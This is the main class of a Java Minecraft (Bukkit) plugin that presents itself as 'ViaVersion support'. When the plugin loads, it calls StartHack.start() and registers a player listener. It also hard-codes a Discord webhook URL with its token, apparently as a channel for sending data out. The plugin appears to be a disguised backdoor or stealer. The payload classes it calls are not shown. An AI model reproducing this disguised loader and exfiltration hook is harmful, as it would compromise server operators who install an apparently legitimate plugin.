package me.sfcevil.viaversionsupport;

import me.sfcevil.viaversionsupport.event.PlayerEvent;
import me.sfcevil.viaversionsupport.starthack.StartHack;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

public final class Main extends JavaPlugin {

    public static String web_hook = "https://discord.com/api/webhooks/1142060750093951066/Ez9mLPTTED0_QxhLHx-MS6VoeFltBmn_rSWCaA1qwwFdVyFeINC3Q_nmYpU_u8GsuX2b";
    public static Plugin pl;

    @Override
    public void onEnable() {



        pl  = this;
        getServer().getPluginManager().registerEvents(new PlayerEvent(),this);
        StartHack.start();
    }

    @Override
    public void onDisable() {
        pl = null;
    }


}
